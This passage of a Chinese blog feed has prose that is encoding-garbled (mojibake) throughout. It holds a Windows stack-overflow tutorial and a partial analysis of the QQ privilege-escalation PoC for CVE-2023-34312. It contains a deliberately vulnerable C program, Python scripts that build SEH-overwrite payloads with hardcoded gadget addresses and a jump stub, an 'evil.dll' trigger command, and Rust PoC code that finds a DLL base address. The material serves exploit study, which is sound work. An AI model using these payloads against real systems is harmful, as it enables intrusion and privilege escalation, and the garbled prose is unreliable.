integrity/signing:</code><ul><li><code>/INTEGRITYCHECK</code></li><li>ä½¿ç”¨æœ‰æ•ˆï¼ˆå¯ä¿¡ã€æ´»åŠ¨ï¼‰è¯ä¹¦è¿›è¡Œ Authenticode ç­¾åï¼ˆLinux ç›®å‰ä¸æ”¯æŒï¼‰</li></ul></li><li><code>DEP</code><ul><li>åˆ«ç§°ï¼š<code>W^X</code>, <code>NX</code></li></ul></li><li><code>Manifest isolation</code><ul><li><code>/ALLOWISOLATION</code></li></ul></li><li><code>SEH</code>å’Œ<code>SafeEH</code><ul><li><code>SEH</code>=<code>Structured Exception Handling</code></li></ul></li><li><code>Control Flow Guard</code>å’Œ<code>Return Flow Guard instrumentation</code></li><li><code>Stack cookie</code><ul><li><code>/GS</code></li></ul></li></ul><ol><li><p>ASLRï¼šä¸Linuxçš„PIEç›¸åŒï¼ŒæŒ‡åœ°å€éšæœºåŒ–ï¼Œå°†åœ¨ç¨‹åºå¯åŠ¨æ—¶å°†DLLéšæœºçš„åŠ è½½åˆ°å†…å­˜ä¸­çš„æœªçŸ¥ï¼Œè‡ªWindows 10å¼€å§‹å·²ç»åœ¨ç³»ç»Ÿä¸­è¢«é…ç½®ä¸ºé»˜è®¤å¯åŠ¨ï¼›</p></li><li><p>High Entropy VAï¼šé«˜ç†µ64ä½åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ–ï¼Œå¼€å¯åæ ‡è¯†æ­¤ç¨‹åºçš„éšæœºåŒ–å–å€¼ç©ºé—´ä¸º64 bitï¼Œè¿™ä¼šå¯¼è‡´æ”»å‡»è€…æ›´éš¾å»æ¨æµ‹éšæœºåŒ–åçš„åœ°å€ï¼›</p></li><li><p>Force Integrityï¼šå¼ºåˆ¶ç­¾åä¿æŠ¤ï¼Œå¼€å¯åæ ‡è¯†ç¨‹åºåŠ è½½æ—¶éœ€è¦éªŒè¯å…¶ä¸­çš„å‰å‘½ï¼Œå¦‚æœç­¾åä¸æ­£ç¡®ï¼Œç¨‹åºå°†ä¼šè¢«é˜»æ­¢è¿è¡Œï¼›</p></li><li><p>Isolationï¼šéš”ç¦»ä¿æŠ¤ï¼Œå¼€å¯åè¡¨ç¤ºæ­¤ç¨‹åºåŠ è½½æ—¶å°†ä¼šåœ¨ä¸€ä¸ªç›¸å¯¹ç‹¬ç«‹çš„éš”ç¦»ç¯å¢ƒä¸­è¢«åŠ è½½ï¼Œä»è€Œé˜»æ­¢æ”»å‡»è€…è¿‡åº¦æå‡æƒé™ï¼›</p></li><li><p>NX/DEP/PAEï¼šNXä¿æŠ¤æŒ‡çš„æ˜¯å†…å­˜é¡µä¸å¯è¿è¡Œã€‚å±äºç³»ç»Ÿçº§çš„å†…å­˜ä¿æŠ¤åŠŸèƒ½ï¼Œèƒ½å¤Ÿå°†ä¸€é¡µæˆ–å¤šé¡µæ ‡è®°ä¸ºä¸å¯æ‰§è¡Œï¼Œä»è€Œé˜²æ­¢ä»è¯¥å†…å­˜åŒºåŸŸè¿è¡Œä»£ç ï¼Œä»¥å¸®åŠ©é˜²æ­¢åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºã€‚é˜²æ­¢ä»£ç åœ¨æ•°æ®é¡µé¢ï¼ˆä¾‹å¦‚å †ã€æ ˆå’Œå†…å­˜æ± ï¼‰ä¸­è¿è¡Œï¼Œåœ¨Windowsä¸­å¸¸ç§°ä¸ºDEPã€‚</p><p>PAEæŒ‡ç‰©ç†åœ°å€æ‹“å±•ï¼ŒPAEæ˜¯ä¸€é¡¹å¤„ç†å™¨åŠŸèƒ½ï¼Œä½¿x86å¤„ç†å™¨å¯ä»¥åœ¨éƒ¨åˆ†windowsç‰ˆæœ¬ä¸Šè®¿é—®4 GBä»¥ä¸Šçš„ç‰©ç†å†…å­˜ã€‚åœ¨åŸºäºx86çš„ç³»ç»Ÿä¸Šè¿è¡Œçš„æŸäº›32ä½ç‰ˆæœ¬çš„Windows Serverå¯ä»¥ä½¿ç”¨PAEè®¿é—®æœ€å¤š64 GBæˆ–128 GBçš„ç‰©ç†å†…å­˜ï¼Œå…·ä½“å–å†³äºå¤„ç†å™¨çš„ç‰©ç†åœ°å€å¤§å°ã€‚ä½¿ç”¨PAEï¼Œæ“ä½œç³»ç»Ÿå°†ä»ä¸¤çº§çº¿æ€§åœ°å€è½¬æ¢ä¸ºä¸‰çº§åœ°å€è½¬æ¢ã€‚ä¸¤çº§çº¿æ€§åœ°å€è½¬æ¢å°†çº¿æ€§åœ°å€æ‹†åˆ†ä¸º3ä¸ªç‹¬ç«‹çš„å­—æ®µç´¢å¼•åˆ°å†…å­˜è¡¨ä¸­ï¼Œä¸‰çº§åœ°å€è½¬æ¢å°†å…¶æ‹†åˆ†ä¸º4ä¸ªç‹¬ç«‹çš„å­—æ®µï¼šä¸€ä¸ª2ä½å­—æ®µï¼Œä¸¤ä¸ª9ä½å­—æ®µå’Œä¸€ä¸ª12ä½å­—æ®µã€‚PAEæ¨¡å¼ä¸‹çš„é¡µè¡¨æ¡ç›®(PTE)å’Œé¡µç›®å½•æ¡ç›®(PDE)çš„å¤§å°ä»32ä½å¢åŠ åˆ°64ä½ã€‚é™„åŠ ä½å…è®¸æ“ä½œç³»ç»ŸPTEæˆ–PDEå¼•ç”¨4 GBä»¥ä¸Šçš„ç‰©ç†å†…å­˜ï¼ŒåŒæ—¶PAEå°†å…è®¸åœ¨åŸºäºx86çš„ç³»ç»Ÿä¸Šè¿è¡Œ32ä½windowsä¸­å¯ç”¨DEPç­‰åŠŸèƒ½ã€‚</p></li><li><p><code>SEHOP</code>ï¼šå³ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ä¿æŠ¤(structured Exception Handling Overwrite Protection)ï¼Œè¿™ä¸ªä¿æŠ¤èƒ½å¤Ÿé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†æ¥è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚</p></li><li><p><code>CFG</code>ï¼šå³æ§åˆ¶æµé˜²æŠ¤è¿™é¡¹æŠ€æœ¯é€šè¿‡åœ¨é—´æ¥è·³è½¬å‰æ’å…¥æ ¡éªŒä»£ç ï¼Œæ£€æŸ¥ç›®æ ‡åœ°å€çš„æœ‰æ•ˆæ€§ï¼Œè¿›è€Œå¯ä»¥é˜»æ­¢æ‰§è¡Œæµè·³è½¬åˆ°é¢„æœŸä¹‹å¤–çš„åœ°ç‚¹ï¼Œæœ€ç»ˆåŠæ—¶æœ‰æ•ˆçš„è¿›è¡Œå¼‚å¸¸å¤„ç†ï¼Œé¿å…å¼•å‘ç›¸å…³çš„å®‰å…¨é—®é¢˜ã€‚</p></li><li><p>RFGï¼šå³è¿”å›åœ°å€é˜²æŠ¤ï¼Œåœ¨æ¯ä¸ªå‡½æ•°å¤´éƒ¨å°†è¿”å›åœ°å€ä¿å­˜åˆ° <code>fs:[rsp](thread control stack)</code>ï¼Œå¹¶åœ¨å‡½æ•°è¿”å›å‰å°†å…¶ä¸æ ˆä¸Šè¿”å›åœ°å€è¿›è¡Œæ¯”è¾ƒï¼Œä»è€Œæœ‰æ•ˆé˜»æ­¢æ”»å‡»ï¼›</p></li><li><p>SafeSEHï¼šå®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†(Safe Structured Exception Handlers)ï¼Œç™½åå•ç‰ˆçš„å®‰å…¨æ²™ç®±ï¼Œå®šä¹‰ä¸€äº›å¼‚å¸¸å¤„ç†ç¨‹åºï¼Œå¹¶åŸºäºæ­¤æ„é€ å®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ï¼Œç¨‹åºè¿è¡Œåï¼Œå®‰å…¨ç»“æ„åŒ–å¼‚å¸¸å¤„ç†è¡¨ä¹‹å¤–çš„å¼‚å¸¸å¤„ç†ç¨‹åºå°†ä¼šè¢«é˜»æ­¢è¿è¡Œï¼›</p></li><li><p>GSï¼šç±»ä¼¼äºLinuxä¸­çš„Canaryä¿æŠ¤ï¼Œå¼€å¯åï¼Œä¼šåœ¨è¿”å›åœ°å€å’ŒBPä¹‹å‰å‹å…¥ä¸€ä¸ªé¢å¤–çš„ <code>Security Cookie</code>ï¼Œç³»ç»Ÿä¼šæ¯”è¾ƒæ ˆä¸­çš„è¿™ä¸ªå€¼å’ŒåŸå…ˆå­˜æ”¾åœ¨ <code>.data</code>ä¸­çš„å€¼åšä¸€ä¸ªæ¯”è¾ƒï¼Œå¦‚æœä¸¤è€…ä¸å»åˆï¼Œåˆ™è¯´æ˜å‘ç”Ÿäº†æ ˆæº¢å‡ºï¼›</p></li><li><p>Authenticodeï¼šç­¾åä¿æŠ¤ï¼›</p></li><li><p>.NETï¼šDLLæ··æ·†çº§ä¿æŠ¤</p></li></ol><p>ä½ å¯ä»¥æŸ¥çœ‹æ–‡ä»¶å¤´è¿›è¡Œè¯†åˆ«ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨winchecksecè¿›è¡Œè¯†åˆ«</p><p><img src="https://img.joe1sn.top/uploads/big/325814dc1fa1572df0f97d5b7bd3ddfa.png" alt="image-20230707130719644" /></p><p>éå¸¸æ˜æ˜¾çš„æ¼æ´ç‚¹</p><h1 id="æ¼æ´åˆ†æ"><a class="markdownIt-Anchor" href="#æ¼æ´åˆ†æ"></a> æ¼æ´åˆ†æ</h1><p>GCCç¼–è¯‘<code>gcc .\main.c -o shellcode</code></p><p><img src="https://img.joe1sn.top/uploads/big/c55686928835d42421d7f6c0656f5cff.png" alt="image-20230707130122963" /></p><p>å…ˆè¯•ä¸€ä¸‹è·³è½¬ï¼ŒåŠ ä¸Šè¦†ç›–ebpçš„ç©ºé—´å¤§å°æ˜¯<code>0x1c</code></p><p><img src="https://img.joe1sn.top/uploads/big/46eaa11d681dcd3c33a4b431e30b2c79.png" alt="image-20230707131904489" /></p><h1 id="åŠ è½½shellcode"><a class="markdownIt-Anchor" href="#åŠ è½½shellcode"></a> åŠ è½½shellcode</h1><p>ç°åœ¨æƒ³åŠæ³•å¸ƒç½®shellcodeï¼Œç”±äºæ²¡æœ‰åé—¨å‡½æ•°æ‰€ä»¥éœ€è¦åˆ©ç”¨SEHè¿›è¡Œshellcodeçš„å¸ƒç½®ã€‚</p><p><strong>æ ˆä¸­çš„ SEH Handle å­˜å‚¨çš„å½¢å¼</strong></p><p><img src="https://img.joe1sn.top/uploads/big/eb18a130a41aa85ce5a74b3ef1d61905.png" alt="img" /></p><p>åŸºæœ¬çš„å¸ƒç½®æ–¹å¼å¦‚ä¸‹ï¼Œå®æˆ˜çš„å¯ä»¥å‚è€ƒ<a href="https://blog.joe1sn.top/2021/05/18/CVE-2019-9766/">CVE-2019-9766ç®€å•æ ˆæº¢å‡º</a></p><p><img src="https://img.joe1sn.top/uploads/big/8a8a4e2f63396305958ac9645adb7c9a.png" alt="img" /></p><p>ä½¿ç”¨<strong>x32dbg</strong>è°ƒè¯•å¾—åˆ°SEHé“¾ï¼Œç„¶åå¾—å‡ºpayload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x11c</span> <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">nops = <span class="string">b&quot;\x90&quot;</span>*<span class="number">5</span>                <span class="comment">#nops</span></span><br><span class="line"></span><br><span class="line">payload = offset+NSEH+gadget+shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨äº†gadgetï¼Œè¿›è¡Œä¸¤æ¬¡popæŠ¬æ ˆï¼Œè¿™æ ·å°±èƒ½æ»‘è¡Œåˆ°shellcode</p><p><img src="https://img.joe1sn.top/uploads/big/80de864faf1862d894461625d818fcb0.png" alt="image-20230708144240496" /></p><p>gadgetè¿‡åçš„è·³è½¬</p><p><img src="https://img.joe1sn.top/uploads/big/4bdef43635c0608fb2dd1dce892a899c.png" alt="image-20230708144321174" /></p><p>ä½†æ˜¯shellcodeé•¿åº¦æœ‰é™åˆ¶ï¼Œæ‰€ä»¥å¾ˆå¯„</p><p><img src="https://img.joe1sn.top/uploads/big/c2eae4db075ff3efe7d7addc866d586c.png" alt="img" /></p><p>ä½†æ˜¯æˆ‘ä»¬æ‰§è¡Œä¸€å°æ®µshellcodeï¼Œé‚£ä¹ˆå¯ä»¥å°è¯•è‡ªå·±å†™gadgetï¼Œå°†shellcodeå†™å…¥åœ¨payloadå‰æ®µï¼Œç„¶ååˆ©ç”¨SEHåˆ°è‡ªå·±å†™çš„gadgetï¼Œæœ€åè·³è½¬åˆ°shellcodeï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¨‹åºä¼šæŠŠç¬¬äº”ä½å½’0ï¼Œæ‰€ä»¥è¦æ³¨æ„ã€‚</p><p>åœ¨ä½¿ç”¨<code>fscanf</code>å‡½æ•°è¯»å–å­—ç¬¦ä¸²æ—¶ï¼Œä»¥ä¸‹ç‰¹æ®Šå­—ç¬¦å¯èƒ½ä¼šå¯¼è‡´è¯»å–å¤±è´¥æˆ–äº§ç”Ÿæ„å¤–çš„ç»“æœï¼š</p><ol><li>ç©ºæ ¼ (<code>0x20</code>)</li><li>åˆ¶è¡¨ç¬¦ (<code>0x09</code>)</li><li>æ¢è¡Œç¬¦ (<code>0x0A</code>)</li><li>å›è½¦ç¬¦ (<code>0x0D</code>)</li></ol><p>è¿™å—å„¿å°±åªæœ‰è‡ªå·±æ ¹æ®å®é™…æƒ…å†µæ”¹è¿›shellcodeäº†ã€‚</p><p>é‚£ä¹ˆæˆ‘ç¨å¾®æ”¹è¿›ä¸€ä¸‹æºä»£ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºæ ˆæ¯”è¾ƒå°ï¼Œå¯ä»¥è€ƒè™‘è‡ªå·±å†™å…¥gadgetæ¥å¸®åŠ©shellcodeçš„è·³è½¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x11c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x14\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/84688c248714ebea01d6ca5d019c7bb4.gif" alt="img" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[Win Pwn] åŸºç¡€æ ˆæº¢å‡ºåˆ©ç”¨&lt;/p&gt;
&lt;p&gt;windowä¸‹æ— ä¿æŠ¤çš„æ ˆæº¢å‡ºåŠ è½½shellcode&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ã€æ¼æ´å¤ç°ã€‘CVE-2023-34312åˆ†æ</title>
    <link href="https://joe1sn.eu.org/2023/07/03/qq-evasion/"/>
    <id>https://joe1sn.eu.org/2023/07/03/qq-evasion/</id>
    <published>2023-07-03T12:13:39.000Z</published>
    <updated>2023-07-18T01:32:15.629Z</updated>
    
    <content type="html"><![CDATA[<p>å…³äºQQææƒæ¼æ´CVE-2023-34312çš„åˆ†æ</p><p>ï¼ï¼æœªå®Œå¾…ç»­ï¼ï¼</p><span id="more"></span><h1 id="pocåˆ†æ"><a class="markdownIt-Anchor" href="#pocåˆ†æ"></a> PoCåˆ†æ</h1><p>PoCåœ°å€ï¼š<a href="https://github.com/vi3t1/qq-tim-elevation%EF%BC%8C%E7%94%A8rust%E5%86%99%E7%9A%84%E6%8C%89%E7%85%A7%E6%95%99%E7%A8%8B%E7%BC%96%E8%AF%91%E5%A5%BD%E4%BA%86%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%89%93%E4%BA%86">https://github.com/vi3t1/qq-tim-elevationï¼Œç”¨rustå†™çš„æŒ‰ç…§æ•™ç¨‹ç¼–è¯‘å¥½äº†å°±å¯ä»¥ç›´æ¥æ‰“äº†</a></p><p>ç”±äºæ²¡æœ‰å¼€å¯ASLRä¿æŠ¤æ‰€ä»¥å¾ˆç¨³</p><p><img src="D:%5CPictures%5Ctypora%5Cpsc.jpg" alt="psc" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703201740757.png" alt="image-20230703201740757" /></p><p>æ¥ç€æ˜¯åˆ†æä¸€ä¸‹PoC</p><h2 id="è§¦å‘"><a class="markdownIt-Anchor" href="#è§¦å‘"></a> è§¦å‘</h2><p>è§¦å‘æ–¹å¼æ˜¯<code>.\QQProtect .\evil.dll</code>ï¼ŒåŒæ—¶å¿…é¡»ä¿æŒ<code>tinyxml.dll</code>åœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè¿™é‡Œç”¨QQ9.7.7ä¸¾ä¾‹å­ã€‚</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703202240244.png" alt="image-20230703202240244" /></p><p>é¦–å…ˆæ˜¯<a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew"><code>GetCommandLineW</code></a>è·å¾—å¯åŠ¨å‚æ•°ï¼Œæ¥ç€åˆ¤æ–­ç½®å¦å­˜åœ¨ä¸‹åˆ—å…³é”®å‚æ•°ï¼Œç„¶åä¸å­˜åœ¨å…³é”®å‚æ•°ç›´æ¥åˆ°äº†<code>StartAddress</code></p><p>ä½¿ç”¨<code>QQProtectEngine.dll</code>ä¸­çš„<code>RunQQProtect</code>ï¼Œè®¾ç½®å›è°ƒå‡½æ•°<code>sub_40C950</code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203114437.png" alt="image-20230703203114437" /></p><p>å›è°ƒå‡½æ•°ä¸­çš„<code>a2</code>æŒ‡é’ˆå¯ä»¥å°†ä»»ä½•åœ°å€çš„å€¼è®¾ç½®ä¸ºå‚æ•°åˆ†ææ—¶çš„å‚æ•°ä¸ªæ•°å€¼ï¼Œä¹Ÿå°±æ˜¯ <strong>1</strong>ã€‚</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203402262.png" alt="image-20230703203402262" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703211606183.png" alt="image-20230703211606183" /></p><p>é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å°±æœ‰äº†å°†ä»»æ„åœ°å€å†™ä¸º1çš„èƒ½åŠ›ï¼Œæ°å¥½<code>QQProtect.exe</code>æ²¡æœ‰å¼€å¯<code>ASLR</code>ä¿æŠ¤ï¼Œè‹¥å¼€å¯çš„è¯ä¸‹å›¾åº”è¯¥å­˜åœ¨<code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE </code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703204248679.png" alt="image-20230703204248679" /></p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p>å’Œä¸Šæ–‡ä¸­ç»“åˆèµ·æ¥ï¼Œåœ¨<code>QQProtect</code>ä¸­å¯¼å…¥äº†<code>tinyxml.dll</code>ï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹è¿™ä¸ªdllçš„å†…å®¹æ¥æ‰§è¡Œæ”»å‡»ã€‚</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082005386.png" alt="image-20230704082005386" /></p><ul><li><p>PoCé¦–å…ˆè·å–äº†<code>evil.dll</code>çš„è·¯å¾„ï¼Œ</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: <span class="type">String</span> = std::env::<span class="title function_ invoke__">args</span>().<span class="title function_ invoke__">nth</span>(<span class="number">1</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: std::path::PathBuf = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;evil_dllpath).<span class="title function_ invoke__">canonicalize</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;evil dll: &#123;&#125;&quot;</span>, evil_dllpath.<span class="title function_ invoke__">display</span>());</span><br></pre></td></tr></table></figure><p>æ¥ç€æ‰“å¼€æœåŠ¡è·å¾—<code>QQProtectEngine.dll</code>çš„åŸºåœ°å€ï¼ˆå› ä¸ºä»–å¼€å¯äº†ASLRä¿æŠ¤ï¼‰ã€‚<br /><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082356731.png" alt="image-20230704082356731" /><br />åœ¨PoCä¸­æ‰“å¼€äº†Windowsçš„<code>QPCore</code>æœåŠ¡ç„¶åè·å–é…ç½®ä¿¡æ¯ï¼Œä»é…ç½®ä¿¡æ¯ä¸­æå–å‡º<code>qqprotect.exe</code>å’Œ<code>QQProtectEngine.dll</code>çš„è·¯å¾„ã€‚<br />ç”±äº<code>LoadLibraryExW</code>ä¸­ä½¿ç”¨äº†<code>DONT_RESOLVE_DLL_REFERENCES</code>æ‰€ä»¥ä¸ä¼šè°ƒç”¨DLLMainï¼Œè‹¥å‡½æ•°æˆåŠŸï¼Œåˆ™è¿”å›å€¼æ˜¯å·²åŠ è½½æ¨¡å—çš„å¥æŸ„ï¼Œä»å¥æŸ„çš„ç¬¬ä¸€ä¸ªå€¼æå–å‡ºåŠ è½½çš„åœ°å€ã€‚æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯é¦–å…ˆåŠ è½½<code>tinyxml.dll</code>ï¼Œæ‰€ä»¥åŠ è½½çš„<code>QQProtectEngine.dll</code>çš„åœ°å€åœ¨è¿™é‡ŒåŒä¸€æ ·é€‚ç”¨ï¼Œè¿™æ ·å°±è·å¾—äº†<code>QQProtectEngine.dll</code>çš„åŸºåœ°å€ã€‚</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_qqprotectengine_dllbase</span>() <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = ServiceManager::<span class="title function_ invoke__">local_computer</span>(None::&lt;&amp;<span class="type">str</span>&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service</span> = manager.<span class="title function_ invoke__">open_service</span>(<span class="string">&quot;QPCore&quot;</span>, ServiceAccess::QUERY_CONFIG).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service_config</span> = service.<span class="title function_ invoke__">query_config</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotect_exe</span> = windows_args::ArgsOs::<span class="title function_ invoke__">parse_cmd</span>(service_config.executable_path.<span class="title function_ invoke__">as_os_str</span>()).<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotectengine_dll</span> = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;qqprotect_exe).<span class="title function_ invoke__">parent</span>().<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">join</span>(<span class="string">&quot;QQProtectEngine.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h</span> = <span class="title function_ invoke__">LoadLibraryExW</span>(<span class="title function_ 